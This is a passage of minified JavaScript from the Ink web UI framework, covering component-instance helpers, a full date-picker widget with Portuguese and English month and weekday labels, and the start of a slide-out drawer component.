e,t,o,r,a,s=i.select("#ink-layout-detector")[0];if(!s){for(o in(s=document.createElement("div")).id="ink-layout-detector",m.Layouts)m.Layouts.hasOwnProperty(o)&&(r=m.Layouts[o],(a=document.createElement("div")).className="show-"+r+" hide-all",a.setAttribute("data-ink-layout",r),s.appendChild(a));document.body.appendChild(s)}for(e=0,t=s.children.length;e<t;++e)if(a=s.children[e],"block"===n.getStyle(a,"display"))return a.getAttribute("data-ink-layout");return"large"},hashSet:function(e){if("object"!=typeof e)throw new TypeError("o should be an object!");var t=o.getAnchorString();t=Ink.extendObj(t,e),window.location.hash=o.genQueryString("",t).substring(1)},cleanChildren:function(t){if(!m.isDOMElement(t))throw new Error("Please provide a valid DOMElement");e.clear(t)},storeIdAndClasses:function(e,t){if(!m.isDOMElement(e))throw"Please provide a valid Element as first parameter";var n=e.id;n&&(t._id=n);var i=e.className;i&&(t._classes=i)},restoreIdAndClasses:function(e,t){if(!m.isDOMElement(e))throw"Please provide a valid Element as first parameter";t._id&&e.id!==t._id&&(e.id=t._id),t._classes&&-1===e.className.indexOf(t._classes)&&(e.className?e.className+=" "+t._classes:e.className=t._classes),t._instanceId&&!e.getAttribute("data-instance")&&e.setAttribute("data-instance",t._instanceId)},_warnDoubleInstantiation:function(e,t){function n(e){return(e.constructor&&e.constructor._name||e._name||"").replace(/_.*?$/,"")}var i=m.getInstance(e);if(""!==n(t)&&i){var o=n(t);if(o){for(var r=0,a=i.length;r<a;r++)if(o===n(i[r]))return Ink.warn("Creating more than one "+o+" for the same element.","(Was creating a "+o+" on:",e,")."),!1;return!0}}},registerInstance:function(e,t){if(e){if(t||(t=e._element),!m.isDOMElement(t))throw new TypeError("Ink.UI.Common.registerInstance: The element passed in is not a DOM element!");if(!1===m._warnDoubleInstantiation(t,e))return!1;var n=p(t);return n||f(t,n=[]),n.push(e),!0}},unregisterInstance:function(e){if(e&&e._element)for(var t=p(e._element),n=0,i=t.length;n<i;n++)t[n]===e&&t.splice(n,1)},getInstance:function(e,t){var n=e;if(e=m.elOrSelector(e),!m.isDOMElement(e))return Ink.warn("Ink.UI.Common: getInstance called on non-element ("+n+")"),[];var i=p(e);if(i||(i=[]),"function"!=typeof t)return i;for(var o=0,r=i.length;o<r;o++)if(i[o]instanceof t)return i[o];return null},getInstanceFromSelector:function(e){return m.getInstance(e)},getInstanceIds:function(){if(h.length>0)return h;var e=[];for(var t in d)d.hasOwnProperty(t)&&e.push(t);return e},getInstances:function(){if(h.length>0)return h;var e=[];for(var t in d)d.hasOwnProperty(t)&&e.push(d[t]);return e},destroyComponent:function(){m.unregisterInstance(this),this._element.parentNode.removeChild(this._element)}};return s._validateInstance=function(e){var t;if("function"!=typeof e._validate)return!0;try{t=e._validate()}catch(e){t=e}return!(t instanceof Error&&(e._validationError=t,1))},s._stubInstance=function(e,t,n){a(t.prototype,e),a(s.prototype,e),Ink.warn(n+" was not correctly created. "+(e._validationError||""))},s.getInstance=function(e){return e=m.elOrSelector(e),m.getInstance(e,this)},Ink.extendObj(s.prototype,{getOption:function(e){return!this.constructor||e in this.constructor._optionDefinition?this._options[e]:void Ink.error('"'+e+'" is not an option for '+this.constructor._name)},setOption:function(e,t){return!this.constructor||e in this.constructor._optionDefinition?void(this._options[e]=t):void Ink.error('"'+e+" is not an option for "+this.constructor._name)},getElement:function(){return this._element}}),m.BaseUIComponent=s,m.createUIComponent=function(e,t){function n(e,t){if(!e)throw new Error("Ink.UI_1.createUIComponent: "+t)}function i(t,i,o){var r=e[t];n(void 0!==r,e+" doesn't have a \""+t+'" property. '+o),n(i&&typeof r===i,"typeof "+e+"."+t+' is not "'+i+'". '+o)}e._componentOptions=t||{},n("function"==typeof e,"constructor argument is not a function!"),i("_name","string","This property is used for error messages. Set it to the full module path and version (Ink.My.Module_1)."),i("_optionDefinition","object","This property contains the option names, types and defaults. See Ink.UI.Common.options() for reference.");var o=e.prototype;"function"==typeof Object.create?e.prototype=Object.create(s.prototype):e.prototype=function(){function e(){}return e.prototype=s.prototype,new e}(),Ink.extendObj(e.prototype,o),e.prototype.constructor=e,Ink.extendObj(e,s)},m})),Ink.createModule("Ink.UI.DatePicker","1",["Ink.UI.Common_1","Ink.Dom.Event_1","Ink.Dom.Css_1","Ink.Dom.Element_1","Ink.Dom.Selector_1","Ink.Util.Array_1","Ink.Util.Date_1","Ink.Util.I18n_1"],(function(e,t,n,i,o,r,a,s){"use strict";function l(e,t,n){return e>n&&(e=n),e<t&&(e=t),e}function c(e,t,n){return{_year:e,_month:t,_day:n}}function u(e){return{_year:e.getFullYear(),_month:e.getMonth(),_day:e.getDate()}}function d(e){return 10*Math.floor(e/10)}function h(){e.BaseUIComponent.apply(this,arguments)}var p=new s({pt_PT:{"datepicker.clean":"Limpar","datepicker.close":"Fechar","datepicker.format":"dd-mm-yyyy","datepicker.of":" de ","datepicker.next_button":"»","datepicker.prev_button":"«","datepicker.months":{1:"Janeiro",2:"Fevereiro",3:"Março",4:"Abril",5:"Maio",6:"Junho",7:"Julho",8:"Agosto",9:"Setembro",10:"Outubro",11:"Novembro",12:"Dezembro"},"datepicker.week_days":{0:"Domingo",1:"Segunda-feira",2:"Terça-feira",3:"Quarta-feira",4:"Quinta-feira",5:"Sexta-feira",6:"Sábado"}},en_US:{"datepicker.clean":"Clear","datepicker.close":"Close","datepicker.format":"dd-mm-yyyy","datepicker.of":" of ","datepicker.next_button":"»","datepicker.prev_button":"«","datepicker.months":{1:"January",2:"February",3:"March",4:"April",5:"May",6:"June",7:"July",8:"August",9:"September",10:"October",11:"November",12:"December"},"datepicker.week_days":{0:"Sunday",1:"Monday",2:"Tuesday",3:"Wednesday",4:"Thursday",5:"Friday",6:"Saturday"}}},"en_US");return h._name="DatePicker_1",h._optionDefinition={autoOpen:["Boolean",!1],pickerField:["Element",null],containerElement:["Element",null],cssClass:["String","ink-calendar bottom"],dateRange:["String",null],displayInSelect:["Boolean",!1],dayField:["Element",null],monthField:["Element",null],yearField:["Element",null],createSelectOptions:["Boolean",!1],format:["String","yyyy-mm-dd"],onFocus:["Boolean",!0],onMonthSelected:["Function",null],onSetDate:["Function",null],onYearSelected:["Function",null],position:["String","right"],showClean:["Boolean",!0],showClose:["Boolean",!0],shy:["Boolean",!0],startDate:["String",null],startWeekDay:["Number",1],validDayFn:["Function",null],validMonthFn:["Function",null],validYearFn:["Function",null],nextValidDateFn:["Function",null],prevValidDateFn:["Function",null],yearRange:["String",null],lang:["String",null],month:["Object",null],wDay:["Object",null],nextLinkText:["String",null],prevLinkText:["String",null],ofText:["String",null],cleanText:["String",null],closeText:["String",null]},h.prototype={_init:function(){this.i18n=p.clone(),this._options.lang&&this.i18n.lang(this._options.lang);var e=this._options.lang||p.lang(),t={};t[e]={},this._options.month&&(t[e]["datepicker.months"]=this._options.month),this._options.wDay&&(t[e]["datepicker.week_days"]=this._options.wDay),this._options.nextLinkText&&(t[e]["datepicker.next_button"]=this._options.nextLinkText),this._options.prevLinkText&&(t[e]["datepicker.prev_button"]=this._options.prevLinkText),this._options.ofText&&(t[e]["datepicker.of"]=this._options.ofText),this._options.cleanText&&(t[e]["datepicker.clean"]=this._options.cleanText),this._options.closeText&&(t[e]["datepicker.close"]=this._options.closeText),function(e){if(Object.keys)return Object.keys(e);var t=[];for(var n in e)e.hasOwnProperty(n)&&t.push(n);return t}(t[e]).length&&this.i18n.append(t),this._options.format=this._dateParsers[this._options.format]||this._options.format,this._hoverPicker=!1,this._picker=this._options.pickerField||null,this._setMinMax(this._options.dateRange||this._options.yearRange),this._options.startDate?this.setDate(this._options.startDate):this._element&&this._element.value?this.setDate(this._element.value):this.setDate(new Date),(this._options.startWeekDay<0||this._options.startWeekDay>6)&&(Ink.warn('Ink.UI.DatePicker_1: option "startWeekDay" must be between 0 (sunday) and 6 (saturday)'),this._options.startWeekDay=l(this._options.startWeekDay,0,6)),this._options.displayInSelect&&this._options.createSelectOptions&&this._createSelectOptions(),Ink.extendObj(this._options,this._lang||{}),this._render(),this._listenToContainerObjectEvents()},_validate:function(){if(this._options.displayInSelect&&!(this._options.dayField&&this._options.monthField&&this._options.yearField))throw new Error("Ink.UI.DatePicker: displayInSelect option enabled.Please specify dayField, monthField and yearField selectors.")},_render:function(){this._containerObject=document.createElement("div"),this._containerObject.className=this._options.cssClass+" ink-datepicker-calendar hide-all",this._renderSuperTopBar();var t=document.createElement("div");t.className="ink-calendar-top",this._monthDescContainer=document.createElement("div"),this._monthDescContainer.className="ink-calendar-month_desc",this._monthPrev=document.createElement("div"),this._monthPrev.className="ink-calendar-prev",this._monthPrev.appendChild(i.create("a",{href:"#prev",className:"change_month_prev",setHTML:this.i18n.text("datepicker.prev_button")})),this._monthNext=document.createElement("div"),this._monthNext.className="ink-calendar-next",this._monthNext.appendChild(i.create("a",{href:"#next",className:"change_month_next",setHTML:this.i18n.text("datepicker.next_button")})),t.appendChild(this._monthPrev),t.appendChild(this._monthDescContainer),t.appendChild(this._monthNext),this._monthContainer=document.createElement("div"),this._monthContainer.className="ink-calendar-month",this._containerObject.appendChild(t),this._containerObject.appendChild(this._monthContainer),this._monthSelector=this._renderMonthSelector(),this._containerObject.appendChild(this._monthSelector),this._yearSelector=document.createElement("ul"),this._yearSelector.className="ink-calendar-year-selector",this._containerObject.appendChild(this._yearSelector),this._options.onFocus&&!this._options.displayInSelect||(this._options.pickerField?this._picker=e.elOrSelector(this._options.pickerField,"pickerField"):this._picker=i.create("a",{href:"#open_cal",setHTML:"open",insertBottom:this._element.parentNode,className:"ink-datepicker-picker-field"})),this._appendDatePickerToDom(),this._renderMonth(),this._monthChanger=i.create("a",{href:"#monthchanger",className:"ink-calendar-link-month",setTextContent:this.i18n.getKey("datepicker.months")[this._month+1]}),this._ofText=i.create("span",{className:"ink-calendar-of-text",setTextContent:this.i18n.text("datepicker.of")}),this._yearChanger=i.create("a",{href:"#yearchanger",className:"ink-calendar-link-year",setTextContent:this._year}),this._monthDescContainer.appendChild(this._monthChanger),this._monthDescContainer.appendChild(this._ofText),this._monthDescContainer.appendChild(this._yearChanger),this._options.inline?this.show():this._addOpenCloseEvents(),this._addDateChangeHandlersToInputs()},_addDateChangeHandlersToInputs:function(){var e=this._element;this._options.displayInSelect&&(e=[this._options.dayField,this._options.monthField,this._options.yearField]),t.observeMulti(e,"change",Ink.bindEvent((function(){this._updateDate(),this._showDefaultView(),this.setDate(),this._options.onSetDate&&this._options.onSetDate(this,{date:this.getDate()}),this._inline||this._hoverPicker||this._hide(!0)}),this))},show:function(){this._updateDate(),this._renderMonth(),n.removeClassName(this._containerObject,"hide-all")},_addOpenCloseEvents:function(){var e=this._picker||this._element;t.observe(e,"click",Ink.bindEvent((function(e){t.stopDefault(e),this.show()}),this)),this._options.autoOpen&&this.show(),this._options.displayInSelect||t.observe(e,"blur",Ink.bindEvent((function(){this._hoverPicker||this._hide(!0)}),this)),this._options.shy&&t.observe(document,"click",Ink.bindEvent((function(e){for(var n=t.element(e),o=[this._options.dayField,this._options.monthField,this._options.yearField,this._picker,this._containerObject,this._element],r=0,a=o.length;r<a;r++)if(o[r]&&(i.descendantOf(o[r],n)||o[r]===n))return;this._hide(!0)}),this))},_renderMonthSelector:function(){var e=document.createElement("ul");e.className="ink-calendar-month-selector";for(var t=document.createElement("ul"),n=1;n<=12;n++)t.appendChild(this._renderMonthButton(n)),n%4==0&&(e.appendChild(t),t=document.createElement("ul"));return e},_renderMonthButton:function(e){var t=document.createElement("li");return t.appendChild(i.create("a",{"data-cal-month":e,setTextContent:this.i18n.getKey("datepicker.months")[e].substring(0,3)})),t},_appendDatePickerToDom:function(){this._options.containerElement&&e.elOrSelector(this._options.containerElement).appendChild(this._containerObject);o.matchesSelector(this._element.parentNode,".ink-form .control-group .control, .ink-form .control-group .control > *")?(this._wrapper=this._element.parentNode,this._wrapperIsControl=!0):(this._wrapper=i.create("div",{className:"ink-datepicker-wrapper"}),i.wrap(this._element,this._wrapper)),i.insertAfter(this._containerObject,this._element)},_renderSuperTopBar:function(){this._options.showClose&&this._options.showClean&&(this._superTopBar=document.createElement("div"),this._superTopBar.className="ink-calendar-top-options",this._options.showClean&&this._superTopBar.appendChild(i.create("a",{className:"clean",setHTML:this.i18n.text("datepicker.clean")})),this._options.showClose&&this._superTopBar.appendChild(i.create("a",{className:"close",setHTML:this.i18n.text("datepicker.close")})),this._containerObject.appendChild(this._superTopBar))},_listenToContainerObjectEvents:function(){t.observe(this._containerObject,"mouseover",Ink.bindEvent((function(e){t.stopDefault(e),this._hoverPicker=!0}),this)),t.observe(this._containerObject,"mouseout",Ink.bindEvent((function(e){t.stopDefault(e),this._hoverPicker=!1}),this)),t.observe(this._containerObject,"click",Ink.bindEvent(this._onClick,this))},_onClick:function(e){var i=t.element(e);return n.hasClassName(i,"ink-calendar-off")?(t.stopDefault(e),null):(t.stopDefault(e),this._onRelativeChangerClick(i),this._onAbsoluteChangerClick(i),n.hasClassName(i,"ink-calendar-link-month")?this._showMonthSelector():n.hasClassName(i,"ink-calendar-link-year")?this._showYearSelector():n.hasClassName(i,"clean")?this._clean():n.hasClassName(i,"close")&&this._hide(!1),void this._updateDescription())},_onRelativeChangerClick:function(e){var t={change_year_next:1,change_year_prev:-1},n={change_month_next:1,change_month_prev:-1};e.className in n?this._updateCal(n[e.className]):e.className in t&&this._showYearSelector(t[e.className])},_onAbsoluteChangerClick:function(e){var t=i.data(e);Number(t.calDay)?(this.setDate(new Date(this._year,this._month,t.calDay),e),this._options.shy?this._hide():this._updateCal()):Number(t.calMonth)?(this._month=Number(t.calMonth)-1,this._showDefaultView(),this._updateCal()):Number(t.calYear)&&this._changeYear(Number(t.calYear))},_changeYear:function(e){e=+e,isNaN(e)||(this._year=e,"function"==typeof this._options.onYearSelected&&this._options.onYearSelected(this,{year:this._year}),this._showMonthSelector())},_clean:function(){this._options.displayInSelect?(this._options.yearField.selectedIndex=0,this._options.monthField.selectedIndex=0,this._options.dayField.selectedIndex=0):this._element.value=""},_hide:function(e){(!1===(e=void 0===e||e)||e&&this._options.shy)&&n.addClassName(this._containerObject,"hide-all")},_setMinMax:function(e){function t(){n._min=i,n._max=o}var n=this,i={_year:-Number.MAX_VALUE,_month:0,_day:1},o={_year:Number.MAX_VALUE,_month:11,_day:31};if(!e)return t();var a=e.split(":"),s=/^(\d{4})((\-)(\d{1,2})((\-)(\d{1,2}))?)?$/;r.each([{name:"_min",date:a[0],noLim:i},{name:"_max",date:a[1],noLim:o}],Ink.bind((function(e){var t=e.noLim;"NOW"===e.date.toUpperCase()?t=u(new Date):"EVER"===e.date.toUpperCase()?t=e.noLim:s.test(e.date)&&((t=function(e){var t=e.split("-");return c(+t[0],+t[1]-1,+t[2])}(e.date))._month=l(t._month,0,11),t._day=l(t._day,1,this._daysInMonth(t._year,t._month+1)));this[e.name]=t}),this)),-1!==this._dateCmp(this._max,this._min)||t()},_fitDateToRange:function(e){return this._isValidDate(e)||(e=u(new Date)),-1===this._dateCmp(e,this._min)?Ink.extendObj({},this._min):1===this._dateCmp(e,this._max)?Ink.extendObj({},this._max):Ink.extendObj({},e)},_dateWithinRange:function(e){return arguments.length||(e=this),!this._dateAboveMax(e)&&!this._dateBelowMin(e)},_dateAboveMax:function(e){return 1===this._dateCmp(e,this._max)},_dateBelowMin:function(e){return-1===this._dateCmp(e,this._min)},_dateCmp:function(e,t){return this._dateCmpUntil(e,t,"_day")},_dateCmpUntil:function(e,t,n){var i=["_year","_month","_day"],o=-1;do{if(e[i[++o]]>t[i[o]])return 1;if(e[i[o]]<t[i[o]])return-1}while(i[o]!==n&&void 0!==e[i[o+1]]&&void 0!==t[i[o+1]]);return 0},_createSelectOptions:function(){function e(){var e=new Date(+a.value,o.value-1+1,0).getDate();i.setHTML(n,""),i.fillSelect(n,r.range(1,e+1),!0)}var n=this._options.dayField,o=this._options.monthField,a=this._options.yearField;i.setHTML(o,""),i.setHTML(a,""),i.fillSelect(o,r.map(["Janeiro","Fevereiro","Março","Abril","Maio","Junho","Julho","Agosto","Setembro","Outubro","Novembro","Dezembro"],(function(e,t){return[t+1,e]})),!0),i.fillSelect(a,r.range(1900,2e3),!0),t.observeMulti([o,a],"change",e),e()},_showDefaultView:function(){this._yearSelector.style.display="none",this._monthSelector.style.display="none",this._monthPrev.childNodes[0].className="change_month_prev",this._monthNext.childNodes[0].className="change_month_next",this._getPrevMonth()||(this._monthPrev.childNodes[0].className="action_inactive"),this._getNextMonth()||(this._monthNext.childNodes[0].className="action_inactive"),this._monthContainer.style.display="block"},_updateDate:function(){var e;!this._options.displayInSelect&&this._element.value?e=this._parseDate(this._element.value):this._options.displayInSelect&&(e={_year:this._options.yearField[this._options.yearField.selectedIndex].value,_month:this._options.monthField[this._options.monthField.selectedIndex].value-1,_day:this._options.dayField[this._options.dayField.selectedIndex].value}),e&&(e=this._fitDateToRange(e),this._year=e._year,this._month=e._month,this._day=e._day),this._setDate(),this._updateDescription(),this._renderMonth()},_updateDescription:function(){i.setTextContent(this._monthChanger,this.i18n.getKey("datepicker.months")[this._month+1]),i.setTextContent(this._ofText,this.i18n.text("datepicker.of")),i.setTextContent(this._yearChanger,this._year)},_showYearSelector:function(e){this._incrementViewingYear(e);var t=this._year-this._year%10,n=t-1;i.setHTML(this._yearSelector,"");var o=i.create("ul");if(this._yearSelector.appendChild(o),n>this._min._year){var r=i.create("li");r.appendChild(i.create("a",{href:"#year_prev",className:"change_year_prev",setHTML:this.i18n.text("datepicker.prev_button")})),o.appendChild(r)}else o.appendChild(i.create("li",{setHTML:"&nbsp;"}));for(var a=1;a<11;a++)a%4==0&&(o=i.create("ul"),this._yearSelector.appendChild(o)),n=t+a-1,o.appendChild(this._getYearButton(n));if(n<this._max._year){var s=i.create("li");s.appendChild(i.create("a",{href:"#year_next",className:"change_year_next",setHTML:this.i18n.text("datepicker.next_button")})),o.appendChild(s)}else o.appendChild(i.create("li",{setHTML:"&nbsp;"}));this._monthPrev.childNodes[0].className="action_inactive",this._monthNext.childNodes[0].className="action_inactive",this._monthSelector.style.display="none",this._monthContainer.style.display="none",this._yearSelector.style.display="block"},_incrementViewingYear:function(e){if(e){var t=+this._year+10*e;(t-=t%10)>this._max._year||t+9<this._min._year||(this._year=+this._year+10*e)}},_getYearButton:function(e){var t="";this._acceptableYear({_year:e})?e===this._year&&(t="ink-calendar-on"):t="ink-calendar-off";var n=i.create("li");return n.appendChild(i.create("a",{href:"#","data-cal-year":e,className:t,setTextContent:e})),n},_showMonthSelector:function(){this._yearSelector.style.display="none",this._monthContainer.style.display="none",this._monthPrev.childNodes[0].className="action_inactive",this._monthNext.childNodes[0].className="action_inactive",this._addMonthClassNames(),this._monthSelector.style.display="block"},_parseDate:function(e){var t=a.set(this._options.format,e);return t?u(t):null},_isValidDate:function(e){var t=/^\d{1,2}$/;return/^\d{4}$/.test(e._year)&&t.test(e._month)&&t.test(e._day)&&+e._month+1>=1&&+e._month+1<=12&&+e._day>=1&&+e._day<=this._daysInMonth(e._year,e._month+1)},_isDate:function(e,t){try{if(void 0===e)return!1;var n=a.set(e,t);if(n&&this._isValidDate(u(n)))return!0}catch(e){}return!1},_acceptableDay:function(e){return this._acceptableDateComponent(e,"validDayFn")},_acceptableMonth:function(e){return this._acceptableDateComponent(e,"validMonthFn")},_acceptableYear:function(e){return this._acceptableDateComponent(e,"validYearFn")},_acceptableDateComponent:function(e,t){return this._options[t]?this._callUserCallbackBool(this._options[t],e):this._dateWithinRange(e)},_writeDateInFormat:function(){return a.get(this._options.format,this.getDate())},setDate:function(e,t){if(e&&"function"==typeof e.getDate&&(e=[e.getFullYear(),e.getMonth()+1,e.getDate()].join("-")),/\d{4}-\d{1,2}-\d{1,2}/.test(e)){var n=e.split("-");this._year=+n[0],this._month=+n[1]-1,this._day=+n[2]}this._setDate(t)},getDate:function(){if(!this._day)throw"Ink.UI.DatePicker: Still picking a date. Cannot getDate now!";return new Date(this._year,this._month,this._day)},_setDate:function(e){if(e){var t=i.data(e);this._day=+t.calDay||this._day,this._options.onSetDate&&this._options.onSetDate(this,{date:this.getDate()})}var n=this._fitDateToRange(this);if(this._year=n._year,this._month=n._month,this._day=n._day,this._options.displayInSelect)this._options.dayField.value=this._day,this._options.monthField.value=this._month+1,this._options.yearField.value=this._year;else{var o=this._writeDateInFormat();o!==this._element.value&&(this._element.value=o)}},_updateCal:function(e){"function"==typeof this._options.onMonthSelected&&this._options.onMonthSelected(this,{year:this._year,month:this._month}),e&&null===this._updateMonth(e)||this._renderMonth()},_daysInMonth:function(e,t){return{2:e%400==0||e%4==0&&e%100!=0?29:28,4:30,6:30,9:30,11:30}[t]||31},_updateMonth:function(e){var t;return e>0?t=this._getNextMonth():e<0&&(t=this._getPrevMonth()),t?(this._year=t._year,this._month=t._month,void(this._day=t._day)):null},_getNextMonth:function(e){return this._tryLeap(e,"Month","next",(function(e){return e._month+=1,e._month>11&&(e._month=0,e._year+=1),e}))},_getPrevMonth:function(e){return this._tryLeap(e,"Month","prev",(function(e){return e._month-=1,e._month<0&&(e._month=11,e._year-=1),e}))},_getPrevYear:function(e){return this._tryLeap(e,"Year","prev",(function(e){return e._year-=1,e}))},_getNextYear:function(e){return this._tryLeap(e,"Year","next",(function(e){return e._year+=1,e}))},_tryLeap:function(e,t,n,i){e=e||{_year:this._year,_month:this._month,_day:this._day};var o=this["prev"===n?"_min":"_max"];if(0===this._dateCmpUntil(e,o,t))return null;var r=this._options[n+"ValidDateFn"];if(r)return this._callUserCallbackDate(r,e);e=i(e);var a=this._daysInMonth(e._year,e._month+1);return e._day>a&&(e._day=a),e=this._fitDateToRange(e),this["_acceptable"+t](e)?e:null},_getNextDecade:function(e){e=e||{_year:this._year,_month:this._month,_day:this._day};var t=this._getCurrentDecade(e);return t+10>this._max._year?null:t+10},_getPrevDecade:function(e){e=e||{_year:this._year,_month:this._month,_day:this._day};var t=this._getCurrentDecade(e);return d(t-10)<d(this._min._year)?null:t-10},_getCurrentDecade:function(e){return e=e?e._year||e:this._year,d(this._year)},_callUserCallbackBase:function(e,t){return e.call(this,t._year,t._month+1,t._day)},_callUserCallbackBool:function(e,t){return!!this._callUserCallbackBase(e,t)},_callUserCallbackDate:function(e,t){var n=this._callUserCallbackBase(e,t);return n?u(n):null},_dateParsers:{"yyyy-mm-dd":"Y-m-d","yyyy/mm/dd":"Y/m/d","yy-mm-dd":"y-m-d","yy/mm/dd":"y/m/d","dd-mm-yyyy":"d-m-Y","dd/mm/yyyy":"d/m/Y","dd-mm-yy":"d-m-y","dd/mm/yy":"d/m/y","mm/dd/yyyy":"m/d/Y","mm-dd-yyyy":"m-d-Y"},_renderMonth:function(){var e=this._month,t=this._year;this._showDefaultView(),i.setHTML(this._monthContainer,""),this._monthContainer.appendChild(this._getMonthCalendarHeader(this._options.startWeekDay)),this._monthContainer.appendChild(this._getDayButtons(t,e))},_getFirstDayIndex:function(e,t){var n=new Date(e,t,1).getDay()-(this._options.startWeekDay||0);return(n%=7)<0&&(n+=7),n},_getDayButtons:function(e,t){var n=this._daysInMonth(e,t+1),o=document.createDocumentFragment(),r=i.create("ul");o.appendChild(r);for(var a=this._getFirstDayIndex(e,t),s=0;s<a;s++)r.appendChild(i.create("li",{className:"ink-calendar-empty",setHTML:"&nbsp;"}));for(var l=1;l<=n;l++)(l-1+a)%7==0&&(r=i.create("ul"),o.appendChild(r)),r.appendChild(this._getDayButton(e,t,l));return o},_getDayButton:function(e,t,n){var o={},r=c(e,t,n);this._acceptableDay(r)?(o["data-cal-day"]=n,this._day&&0===this._dateCmp(r,this)&&(o.className="ink-calendar-on")):o.className="ink-calendar-off",o.setTextContent=n;var a=i.create("li");return a.appendChild(i.create("a",o)),a},_getMonthCalendarHeader:function(e){for(var t,n=i.create("ul",{className:"ink-calendar-header"}),o=0;o<7;o++)t=(e+o)%7,n.appendChild(i.create("li",{setTextContent:this.i18n.getKey("datepicker.week_days")[t].substring(0,1)}));return n},_addMonthClassNames:function(e){r.forEach((e||this._monthSelector).getElementsByTagName("a"),Ink.bindMethod(this,"_addMonthButtonClassNames"))},_addMonthButtonClassNames:function(e){var t=i.data(e);if(!t.calMonth)throw"not a calendar month button!";var o=+t.calMonth-1;if(o===this._month)n.addClassName(e,"ink-calendar-on"),n.removeClassName(e,"ink-calendar-off");else{n.removeClassName(e,"ink-calendar-on");var r=!this._acceptableMonth({_year:this._year,_month:o});n.addRemoveClassName(e,"ink-calendar-off",r)}},setI18n:function(e){e.clone&&(e=e.clone()),this.i18n=e},getI18n:function(){return this.i18n||p},setLanguage:function(e){this.i18n||this.setI18n(p),this.i18n.lang(e)},getLanguage:function(){return this.i18n?this.i18n.lang():p.lang()},showMonth:function(){this._renderMonth()},isMonthRendered:function(){var e=o.select(".ink-calendar-header",this._containerObject)[0];return"none"!==n.getStyle(e.parentNode,"display")&&"none"!==n.getStyle(e.parentNode.parentNode,"display")},destroy:function(){i.unwrap(this._element),i.remove(this._wrapper),i.remove(this._containerObject),e.unregisterInstance.call(this)}},e.createUIComponent(h),h})),Ink.createModule("Ink.UI.Drawer","1",["Ink.UI.Common_1","Ink.Dom.Loaded_1","Ink.Dom.Selector_1","Ink.Dom.Element_1","Ink.Dom.Event_1","Ink.Dom.Css_1"],(function(e,t,n,i,o,r){"use strict";function a(){document.addEventListener&&c&&(document.removeEventListener("focus",c,!0),document.removeEventListener("mousedown",c,!0),document.removeEventListener("mouseup",c,!0),c=null)}function s(t,n){e.isDOMElement(t)||(n=t),e.BaseUIComponent.apply(this,[document.body,n])}var l=['[tabindex]:not([tabindex="-1"])',"input","select","textarea","button","object","a[href]","area"].join(","),c=null,u=function(e){var t={WebkitTransitionProperty:"webkitTransitionEnd",transitionProperty:"transitionend"};for(var n in t)if(t.hasOwnProperty(n)&&void 0!==e.style[n])return{styleProp:n,eventName:t[n]};return!1}(document.createElement("div"));return s.transitionSupport=u,s._name="Drawer_1",s._optionDefinition={parentSelector:["String",".ink-drawer"],leftDrawer:["String",".left-drawer"],leftTrigger:["String",".left-drawer-trigger"],rightDrawer:["String",".right-drawer"],rightTrigger:["String",".right-drawer-trigger"],contentDrawer:["String",".content-drawer"],mode:["String","push"],sides:["String","both"]},s.prototype={_init:function(){function e(e){e.drawer&&e.triggers.length?t=!0:n=function(e){return'Ink.UI.Drawer_1: Could not find the "'+e+'" element on this page. Please make sure it exists.'}(e.drawer?e.drawerOption:e.triggerOption)}if(this._contentDrawers=Ink.ss(this._options.contentDrawer),this._leftDrawer=Ink.s(this._options.leftDrawer),this._leftTriggers=Ink.ss(this._options.leftTrigger),this._rightDrawer=Ink.s(this._options.rightDrawer),this._rightTriggers=Ink.ss(this._options.rightTrigger),r.addClassName(document.body,"ink-drawer"),0===this._contentDrawers.length)throw new Error('Ink.UI.Drawer_1: Could not find any "'+this._options.contentDrawer+'" elements on this page. Please make sure you have at least one.');switch(this._options.sides){case"both":this._triggers=this._options.leftTrigger+", "+this._options.rightTrigger+", "+this._options.contentDrawer;break;case"left":this._triggers=this._options.leftTrigger+", "+this._options.contentDrawer;break;case"right":this._triggers=this._options.rightTrigger+", "+this._options.contentDrawer}var t=!1,n=null;"left"!==this._options.sides&&"both"!==this._options.sides||e({name:"left",drawer:this._leftDrawer,drawerOption:this._options.leftDrawer,triggers:this._leftTriggers,triggerOption:this._options.leftTrigger}),"right"!==this._options.sides&&"both"!==this._options.sides||e({name:"right",drawer:this._rightDrawer,drawerOption:this._options.rightDrawer,triggers:this._rightTriggers,triggerOption:this._options.rightTrigger}),t||Ink.warn(n),this._isOpen=!1,this._direction=void 0,this._handlers={click:Ink.bindEvent(this._onClick,this),afterTransition:Ink.bindEvent(this._afterTransition,this)},this._addEvents()},_onClick:function(e){var t=i.findUpwardsBySelector(e.currentTarget,this._options.leftTrigger)?"left":i.findUpwardsBySelector(e.currentTarget,this._options.rightTrigger)?"right":null;if(t)this._onTriggerClicked(e,t);else if(this._isOpen){var n=i.findUpwardsBySelector(e.currentTarget,this._options.contentDrawer),o=i.isLink(e.target);(n||o)&&this.close(),n&&e.preventDefault()}},_onTriggerClicked:function(e,t){this._isOpen?this.close():this.open(t),e.preventDefault()},_afterTransition:function(){this._isOpen||r.removeClassName(this._getRecentDrawer(),"show")},_addEvents:function(){o.on(document.body,"click",this._triggers+', a[href*="#"]',this._handlers.click)},_getRecentDrawer:function(){return"left"===this._direction?this._leftDrawer:"right"===this._direction?this._rightDrawer:null},open:function(e){this._isOpen=!0,this._direction=e;var t=this._getRecentDrawer();r.addClassName(t,"show"),setTimeout(Ink.bind((function(){r.addClassName(document.body,[this._options.mode,e])}),this),0),u&&this._transitionWillOccur(t)&&o.one(t,u.eventName,(function(){r.removeClassName(t,"show"),t.offsetWidth,r.addClassName(t,"show")}));var n=document.activeElement,s=function(e){for(var t=Ink.ss("[tabindex]",e),n=null,i=null,o=0;o<t.length;o++){var r=+t[o].tabIndex;r||t.splice(o,1),(null===n||r<n)&&(n=r,i=t[o])}if(i)return i.focus(),!0;var a=Ink.s(l,e);return!!a&&(a.focus(),!0)}(t);!function(e){if(document.addEventListener){c&&a();var t=!1;c=function(n){return"mousedown"===n.type||"mouseup"===n.type?void(t="mousedown"===n.type):void(t||e(n.target))},document.addEventListener("focus",c,!0),document.addEventListener("mousedown",c,!0),document.addEventListener("mouseup",c,!0)}}(Ink.bind((function(e){i.isAncestorOf(t,e)||(this.close(),a(),s&&n&&n.focus())}),this))},_transitionWillOccur:function(e){return!(!u||!r.getStyle(e,u.styleProp))},close:function(){if(!1!==this._isOpen&&this._getRecentDrawer()){a(),this._isOpen=!1;var 